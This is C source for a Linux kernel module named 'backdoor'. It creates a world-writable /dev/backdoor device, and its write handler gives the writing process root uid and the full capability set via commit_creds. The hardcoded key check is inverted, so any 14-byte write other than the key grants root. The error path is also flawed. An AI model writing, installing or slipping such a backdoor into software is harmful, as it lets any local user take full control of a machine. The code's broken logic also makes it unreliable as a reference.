#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

#define DEVICE_NAME "backdoor"

struct miscdevice backdoor_dev;

const struct file_operations backdoor_fops;

static int __init backdoor_init(void)
{
        int result = 0;

        result = misc_register(&backdoor_dev);
        if (result) {
                printk(KERN_WARNING "Cannot register /dev/backdoor device\n");
                goto err;
        }

        printk(KERN_INFO "The BACKDOOR module has been inserted\n");
        return result;

err:
        misc_deregister(&backdoor_dev);
        return result;
}

static void __exit backdoor_exit(void)
{
        misc_deregister(&backdoor_dev);
        printk(KERN_INFO "The BACKDOOR module has been removed\n");
}

ssize_t backdoor_write(
    struct file* filp, const char __user* user_buf, size_t count, loff_t* f_pos)
{

        char key[] = "qwertyytrewq\0";
        char* buf;
        struct cred* creds;
        size_t key_len = 14;
        ssize_t result = 0;

        if (key_len != count)
                return count;

        buf = kvmalloc(count, GFP_KERNEL);

        if (!buf)
                return -ENOMEM;

        if (copy_from_user(buf, user_buf, count)) {
                result = -EFAULT;
                goto out;
        }

        if (strcmp(key, buf) == 0) {
                result = count;
                goto out;
        }

        creds = prepare_creds();
        if (!creds) {
                result = -ENOMEM;
                goto out;
        }

        creds->uid.val = 0;
        creds->suid.val = 0;
        creds->euid.val = 0;
        creds->fsuid.val = 0;
        creds->cap_permitted = CAP_FULL_SET;
        creds->cap_effective = CAP_FULL_SET;
        creds->cap_inheritable = CAP_FULL_SET;

        commit_creds(creds);
        result = count;
        *f_pos = count;
        printk(KERN_INFO "Root privileges granted\n");

out:
        kvfree(buf);
        return result;
}

struct miscdevice backdoor_dev = {
        .minor = MISC_DYNAMIC_MINOR,
        .fops = &backdoor_fops,
        .mode = 0222,
        .name = DEVICE_NAME,
};

const struct file_operations backdoor_fops = {
        .owner = THIS_MODULE,
        .write = backdoor_write,
};

module_init(backdoor_init);
module_exit(backdoor_exit);
